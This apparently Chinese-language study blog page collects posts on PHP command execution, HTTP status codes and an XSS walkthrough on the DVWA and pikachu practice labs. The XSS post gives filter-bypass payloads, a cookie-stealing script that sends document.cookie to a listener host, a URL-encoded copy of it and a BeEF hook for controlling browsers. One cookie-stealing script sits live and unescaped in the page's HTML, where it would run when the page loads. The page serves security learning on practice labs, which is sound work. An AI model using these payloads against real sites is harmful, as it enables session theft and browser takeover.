<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/plugin/bganimation/bg.css">

  

  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
    <h2 class="author">John Doe</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>53</strong><br>文章</div></a>
      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>主页</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>归档</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分类</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>标签</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main">
  
    <article id="post-命令执行" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
  <time class="post-time" datetime="2024-01-19T06:25:24.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">19</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>命令执行：</p>
<p>system(),passthru(),exec(),&#96;&#96;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">exec(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?pp</span><br><span class="line">echo exec(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$_GET(&#x27;a&#x27;);</span><br><span class="line">system(&#x27;whoami&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>Windows命令连接符</p>
<p>“&amp;”命令前面的语句为假，则直接执行后面的;前面的语句为真，命令都执行。</p>
<p>“&amp;&amp;”前面的语句为假，则直接出错，后面的也不执行;前面为真，都执行。</p>
<p>“|”前面命令正确，直接执行后面的语句;前面的语句为假，则直接出错，后面的也不执行。</p>
<p>“||”前面出错，执行后面的;前面不出错，不会只执行前面的，不执行后面的命令。</p>
<p>Linux下的命令连接符包括“;”、“&amp;”、“&amp;&amp;”、“I”、“Il”。</p>
<p>“:”分号操作符使多个命令顺序执行，前面命令和后面命令的都会执行。</p>
<p>“&amp;”和号操作符,作用是使命令在后台运行,这样就可以同时执行多条命令。</p>
<p>“&amp;&amp;”与操作符,第一个命令执行成功，执行第二个命令。</p>
<p>“|”管道操作符，将第一个命令的输出作为第二个命令的输入，前面跟后面的都会执行，但是只显示后面的执行结果。</p>
<p>“||”或操作符，类似于编程中的 if else语句。前面的命令执行成功后面的命令不会执行，前面的命令执行失败后面的命令会执行。</p>
<p>ctrl + u</p>
<p>view-source:</p>
<p>看源码</p>
<p>看UA头</p>
<p>看robots.txt(机器人文件。)</p>
<p>看index.phps(下载)</p>
<p>kali目录扫描dirsearch -r: <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p>swp数据交换文件</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/19/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clrmsspnz0005j0u42nmeebf0" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-网页状态码" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/17/%E7%BD%91%E9%A1%B5%E7%8A%B6%E6%80%81%E7%A0%81/" class="article-date">
  <time class="post-time" datetime="2024-01-17T12:13:00.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">17</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/17/%E7%BD%91%E9%A1%B5%E7%8A%B6%E6%80%81%E7%A0%81/">网页状态码</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><blockquote>
<p>浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含HTTP状态码的信息头（server header）用以响应浏览器的请求。</p>
<p>HTTP状态码的英文为HTTP Status Code。</p>
</blockquote>
<p>下面是常见的HTTP状态码：</p>
<ul>
<li>200 - 请求成功</li>
<li>301 - 资源（网页等）被永久转移到其它URL</li>
<li>404 - 请求的资源（网页等）不存在</li>
<li>500 - 内部服务器错误</li>
</ul>
<h4 id="HTTP状态码分类"><a href="#HTTP状态码分类" class="headerlink" title="HTTP状态码分类"></a>HTTP状态码分类</h4><p>HTTP状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后两个数字没有分类的作用。HTTP状态码共分为5种类型：</p>
<table>
<thead>
<tr>
<th>分类</th>
<th>分类描述</th>
</tr>
</thead>
<tbody><tr>
<td>1**</td>
<td>信息，服务器收到请求，需要请求者继续执行操作</td>
</tr>
<tr>
<td>2**</td>
<td>成功，操作被成功接收并处理</td>
</tr>
<tr>
<td>3**</td>
<td>重定向，需要进一步的操作以完成请求</td>
</tr>
<tr>
<td>4**</td>
<td>客户端错误，请求包含语法错误或无法完成请求</td>
</tr>
<tr>
<td>5**</td>
<td>服务器错误，服务器在处理请求的过程中发生了错误</td>
</tr>
</tbody></table>
<h4 id="HTTP状态码列表"><a href="#HTTP状态码列表" class="headerlink" title="HTTP状态码列表"></a>HTTP状态码列表</h4><table>
<thead>
<tr>
<th>状态码</th>
<th>状态码英文名称</th>
<th>中文描述</th>
</tr>
</thead>
<tbody><tr>
<td>100</td>
<td>Continue</td>
<td>继续。客户端应继续其请求</td>
</tr>
<tr>
<td>101</td>
<td>Switching Protocols</td>
<td>切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>200</td>
<td>OK</td>
<td>请求成功。一般用于GET与POST请求</td>
</tr>
<tr>
<td>201</td>
<td>Created</td>
<td>已创建。成功请求并创建了新的资源</td>
</tr>
<tr>
<td>202</td>
<td>Accepted</td>
<td>已接受。已经接受请求，但未处理完成</td>
</tr>
<tr>
<td>203</td>
<td>Non-Authoritative Information</td>
<td>非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td>
</tr>
<tr>
<td>204</td>
<td>No Content</td>
<td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td>
</tr>
<tr>
<td>205</td>
<td>Reset Content</td>
<td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td>
</tr>
<tr>
<td>206</td>
<td>Partial Content</td>
<td>部分内容。服务器成功处理了部分GET请求</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>300</td>
<td>Multiple Choices</td>
<td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td>
</tr>
<tr>
<td>301</td>
<td>Moved Permanently</td>
<td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td>
</tr>
<tr>
<td>302</td>
<td>Found</td>
<td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td>
</tr>
<tr>
<td>303</td>
<td>See Other</td>
<td>查看其它地址。与301类似。使用GET和POST请求查看</td>
</tr>
<tr>
<td>304</td>
<td>Not Modified</td>
<td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td>
</tr>
<tr>
<td>305</td>
<td>Use Proxy</td>
<td>使用代理。所请求的资源必须通过代理访问</td>
</tr>
<tr>
<td>306</td>
<td>Unused</td>
<td>已经被废弃的HTTP状态码</td>
</tr>
<tr>
<td>307</td>
<td>Temporary Redirect</td>
<td>临时重定向。与302类似。使用GET请求重定向</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>400</td>
<td>Bad Request</td>
<td>客户端请求的语法错误，服务器无法理解</td>
</tr>
<tr>
<td>401</td>
<td>Unauthorized</td>
<td>请求要求用户的身份认证</td>
</tr>
<tr>
<td>402</td>
<td>Payment Required</td>
<td>保留，将来使用</td>
</tr>
<tr>
<td>403</td>
<td>Forbidden</td>
<td>服务器理解请求客户端的请求，但是拒绝执行此请求</td>
</tr>
<tr>
<td>404</td>
<td>Not Found</td>
<td>服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td>
</tr>
<tr>
<td>405</td>
<td>Method Not Allowed</td>
<td>客户端请求中的方法被禁止</td>
</tr>
<tr>
<td>406</td>
<td>Not Acceptable</td>
<td>服务器无法根据客户端请求的内容特性完成请求</td>
</tr>
<tr>
<td>407</td>
<td>Proxy Authentication Required</td>
<td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td>
</tr>
<tr>
<td>408</td>
<td>Request Time-out</td>
<td>服务器等待客户端发送的请求时间过长，超时</td>
</tr>
<tr>
<td>409</td>
<td>Conflict</td>
<td>服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td>
</tr>
<tr>
<td>410</td>
<td>Gone</td>
<td>客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td>
</tr>
<tr>
<td>411</td>
<td>Length Required</td>
<td>服务器无法处理客户端发送的不带Content-Length的请求信息</td>
</tr>
<tr>
<td>412</td>
<td>Precondition Failed</td>
<td>客户端请求信息的先决条件错误</td>
</tr>
<tr>
<td>413</td>
<td>Request Entity Too Large</td>
<td>由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td>
</tr>
<tr>
<td>414</td>
<td>Request-URI Too Large</td>
<td>请求的URI过长（URI通常为网址），服务器无法处理</td>
</tr>
<tr>
<td>415</td>
<td>Unsupported Media Type</td>
<td>服务器无法处理请求附带的媒体格式</td>
</tr>
<tr>
<td>416</td>
<td>Requested range not satisfiable</td>
<td>客户端请求的范围无效</td>
</tr>
<tr>
<td>417</td>
<td>Expectation Failed</td>
<td>服务器无法满足Expect的请求头信息</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>500</td>
<td>Internal Server Error</td>
<td>服务器内部错误，无法完成请求</td>
</tr>
<tr>
<td>501</td>
<td>Not Implemented</td>
<td>服务器不支持请求的功能，无法完成请求</td>
</tr>
<tr>
<td>502</td>
<td>Bad Gateway</td>
<td>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td>
</tr>
<tr>
<td>503</td>
<td>Service Unavailable</td>
<td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td>
</tr>
<tr>
<td>504</td>
<td>Gateway Time-out</td>
<td>充当网关或代理的服务器，未及时从远端服务器获取请求</td>
</tr>
<tr>
<td>505</td>
<td>HTTP Version not supported</td>
<td>服务器不支持请求的HTTP协议的版本，无法完成处理</td>
</tr>
</tbody></table>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/17/%E7%BD%91%E9%A1%B5%E7%8A%B6%E6%80%81%E7%A0%81/" data-id="clrmsspo30007j0u4bbvacsvu" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-xss漏洞" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/16/xss%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time class="post-time" datetime="2024-01-16T06:52:44.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">16</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/16/xss%E6%BC%8F%E6%B4%9E/">xss漏洞</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="http://192.168.2.103/DVWA-master/DVWA-master/vulnerabilities/xss_r/?name=root#">http://192.168.2.103/DVWA-master/DVWA-master/vulnerabilities/xss_r/?name=root#</a></p>
<script>document.location='http://192.168.2.66/cookie.php?cookie='+document.cookie</script>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="pikachu中XSS漏洞"><a href="#pikachu中XSS漏洞" class="headerlink" title="pikachu中XSS漏洞"></a>pikachu中XSS漏洞</h3><h4 id="一、反射性XSS（get）"><a href="#一、反射性XSS（get）" class="headerlink" title="一、反射性XSS（get）"></a>一、反射性XSS（get）</h4><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117104554284.png" alt="image-20240117104554284"></p>
<p>首先确认页面是否存在xss漏洞，我们输入一些特殊的字符，””&lt;&gt;111，点击提交，看是否被过滤掉了，看返回图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117104721692.png" alt="image-20240117104721692"></p>
<p>发现没有过滤，所以我们简单的输入一个JS，按我们的猜想，它是能弹窗的。</p>
<p>因为限制了长度，需要更改。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117104955818.png" alt="image-20240117104955818"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117105047971.png" alt="image-20240117105047971"></p>
<h4 id="二、反射性XSS（post）"><a href="#二、反射性XSS（post）" class="headerlink" title="二、反射性XSS（post）"></a>二、反射性XSS（post）</h4><p><strong>get方式的XSS漏洞更加容易利用，一般利用的方式是将带有跨站脚本的URL伪装后发给目标。而post方式是以表单方式提交的，无法直接使用URL方式来进行攻击</strong></p>
<p>可以尝试登入进去。、</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117142730958.png" alt="image-20240117142730958"></p>
<h4 id="三、存储型XSS"><a href="#三、存储型XSS" class="headerlink" title="三、存储型XSS"></a>三、存储型XSS</h4><p>存储型xss漏洞跟反射型形成的原因一样，不同的是存储型xss下攻击者可以将脚本注入到后台存储起来，构成更加持久的伤害，因此存储型xss又称为“永久型”xss。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118111404167.png" alt="image-20240118111404167"></p>
<h4 id="四、DOM型XSS"><a href="#四、DOM型XSS" class="headerlink" title="四、DOM型XSS"></a>四、DOM型XSS</h4><p>DOM是什么？<br>通过JavaScript，可以重构整个HTML文档。你可以添加、移除、改变或重新排版。要改变页面的某个东西，JavaScript就需要获得对HTML文档所有元素进行访问的入口，这个入口，连同对HTML元素进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的（DOM）</p>
<p><strong>所以，你可以把DOM理解为一个一个访问HTML的标准编程接口。</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118111902086.png" alt="image-20240118111902086"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118111914212.png" alt="image-20240118111914212"></p>
<p><strong>这里，我们知道 输入的字符串通过DOM的方式拼接到了a的标签中</strong></p>
<p>将其闭合,点击下方按钮。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick = &#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118112112536.png" alt="image-20240118112112536"></p>
<h4 id="五、DOM型XSS-X"><a href="#五、DOM型XSS-X" class="headerlink" title="五、DOM型XSS-X"></a>五、DOM型XSS-X</h4><p>一样是闭合</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118112339721.png" alt="image-20240118112339721"></p>
<p>这个输入是从浏览器的URL中获取的，形成漏洞的输入点是在URL的参数中。</p>
<h4 id="六、XSS盲打"><a href="#六、XSS盲打" class="headerlink" title="六、XSS盲打"></a>六、XSS盲打</h4><p>盲打不是一种漏洞类型，是一个攻击场景。</p>
<p>就是说攻击者在不知道有没有XSS存在的情况下，疯狂的输入XSS代码在留言、feedback之类的地方，尽可能的多尝试XSS存在的方式，叫盲打。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118113103518.png" alt="image-20240118113103518"></p>
<p>不会有弹窗，因为并不在前端，是在后台，我们模拟管理员登录后台：</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118113507395.png" alt="image-20240118113507395"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118113410601.png" alt="image-20240118113410601"></p>
<h4 id="七、XSS绕过"><a href="#七、XSS绕过" class="headerlink" title="七、XSS绕过"></a>七、XSS绕过</h4><p><strong>过滤-转换：</strong></p>
<p> 1.前端限制绕过，直接抓包重放，或者修改html前端代码；</p>
<p>2.大小写，比如：<code>&lt;SCRIPT&gt;aLeRT(111)&lt;sCRIpt&gt;；</code></p>
<p>3.拼凑：<code>&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt;pt&gt;</code>；</p>
<p>4.使用注释进行干扰：<code>&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/sc&lt;!--test--&gt;ript&gt;;</code></p>
<p><strong>过滤-编码：</strong></p>
<p>核心思路：后台过滤了特殊字符，比如<code>&lt;script&gt;</code>标签，但该标签可以被各种编码，后台不一定会过滤。当浏览器对该编码进行识别时，会翻译成正常的标签，从而执行。</p>
<p><strong>大小写绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scRipt&gt;alert(1)&lt;/scrIpt&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118154519871.png" alt="image-20240118154519871"></p>
<h4 id="八、XSS之htmlspecialchars绕过"><a href="#八、XSS之htmlspecialchars绕过" class="headerlink" title="八、XSS之htmlspecialchars绕过"></a>八、XSS之htmlspecialchars绕过</h4><p><strong>关于htmlspecialchars()函数：htmlspecialchars()函数把预定义的字符转换为了HTML实体。</strong></p>
<p>预定义的字符是：<br>1、&amp; （和号）成为 &amp;<br>2、” （双引号）成为 ”<br>3、’ （单引号）成为 ‘<br>4、&lt; （小于）成为 &lt; &gt; （大于）成为 &gt;</p>
<p>在源代码里我们发现输入的被进行了编码，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick = &#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118155227755.png" alt="image-20240118155227755"></p>
<p><strong>XSS常见防范措施：</strong></p>
<blockquote>
<p><strong>总的原则：输入做过滤，输出做转义。</strong></p>
<p><strong>·过滤：根据业务需求进行过滤，比如输入点要求输入手机号，则只允许输入手机号格式的数字。</strong></p>
<p><strong>·转义：所有输出到前端的数据都根据输出点进行转义，比如输出到html中进行htnl实体转义，输入JS里面的进行js转义。</strong></p>
</blockquote>
<h4 id="九、XSS之href输出"><a href="#九、XSS之href输出" class="headerlink" title="九、XSS之href输出"></a>九、XSS之href输出</h4><p><strong>点击文字后弹窗，这是因为输入在a标签的href属性里面，可以使用JavaScript协议来执行JS</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(123)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118155509594.png" alt="image-20240118155509594"></p>
<h4 id="十、XSS之JS输出"><a href="#十、XSS之JS输出" class="headerlink" title="十、XSS之JS输出"></a>十、XSS之JS输出</h4><p>根据提示输入tmac</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118161439532.png" alt="image-20240118161439532"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;/script&gt;&lt;script&gt;alert(&#x27;1&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118161537511.png" alt="image-20240118161537511"></p>
<p>‘&gt; <a href=javascript:alert(1)></p>
<p>‘ onclick &#x3D; ‘alert(1)’</p>
<p>“onclick &#x3D; alert(1) type&#x3D;”button”</p>
<h4 id="xss获取cookie"><a href="#xss获取cookie" class="headerlink" title="xss获取cookie"></a>xss获取cookie</h4><p>我们可以更改cookei登入对方的账号。</p>
<p>1.kali中开启apache</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118103456152.png" alt="image-20240118103456152"></p>
<p>2.cd到apache服务地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html #apache的默认服务地址</span><br></pre></td></tr></table></figure>

<p>4、查看apache的服务所有者和所有者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -axu | grep apache</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118104121021.png" alt="image-20240118104121021"></p>
<p>5、更改cookie.txt文件的所有者为apache服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown www-data:www-data cookie.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118104843193.png" alt="image-20240118104843193"></p>
<p>6、构建xss漏洞加载cookie.php的恶意链接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&#x27;http://192.168.2.77/cookie.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>可以使用url编码将js语句编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/pikachu/vul/xss/xss_reflected_get.php?message=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%32%2e%35%39%2f%63%6f%6f%6b%69%65%2e%70%68%70%3f%63%6f%6f%6b%69%65%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73%63%72%69%70%74%3e</span><br></pre></td></tr></table></figure>

<p>点击后可以在kali中cookie.txt中找到cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat cookie.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118105407130.png" alt="image-20240118105407130"></p>
<h3 id="beef"><a href="#beef" class="headerlink" title="beef"></a>beef</h3><p>在kali自带的浏览器里下载beef。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119101224069.png" alt="image-20240119101224069"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119101650171.png" alt="image-20240119101650171"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install beef-xss</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119101741733.png" alt="image-20240119101741733"></p>
<p>如果出错可以加–fix-missing</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install beef-xss --fix-missing</span><br></pre></td></tr></table></figure>

<p>更新kali</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>

<p>下载好后会自动进入beef页面。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119102228594.png" alt="image-20240119102228594"></p>
<p>username是beef，password是下载beef时设置的密码。</p>
<p>在win10的php根目录下打开beef.php。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119103252926.png" alt="image-20240119103252926"></p>
<p>在主机登入<code>192.168.2.100/beef.php</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119103938729.png" alt="image-20240119103938729"></p>
<p>就可以控制电脑</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119104035588.png" alt="image-20240119104035588"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119104334965.png" alt="image-20240119104334965"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240119104353011.png" alt="image-20240119104353011"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/01/16/xss%E6%BC%8F%E6%B4%9E/" data-id="clrmsspnx0003j0u4h4iqg6be" class="article-share-link">分享</a>
      
      
    </footer>
  </div>
  
</article>




  
    <article id="post-upload上传文件-你上你马呢" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2024/01/10/upload%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E4%BD%A0%E4%B8%8A%E4%BD%A0%E9%A9%AC%E5%91%A2/" class="article-date">
  <time class="post-time" datetime="2024-01-10T08:50:10.000Z" itemprop="datePublished">
    <span class="post-month">1月</span><br/>
    <span class="post-day">10</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/01/10/upload%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6-%E4%BD%A0%E4%B8%8A%E4%BD%A0%E9%A9%AC%E5%91%A2/">upload上传文件</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="upload上传文件-你传你马呢"><a href="#upload上传文件-你传你马呢" class="headerlink" title="upload上传文件_你传你马呢"></a>upload上传文件_你传你马呢</h3><p>上传文件木马，并查找你的文件名。</p>
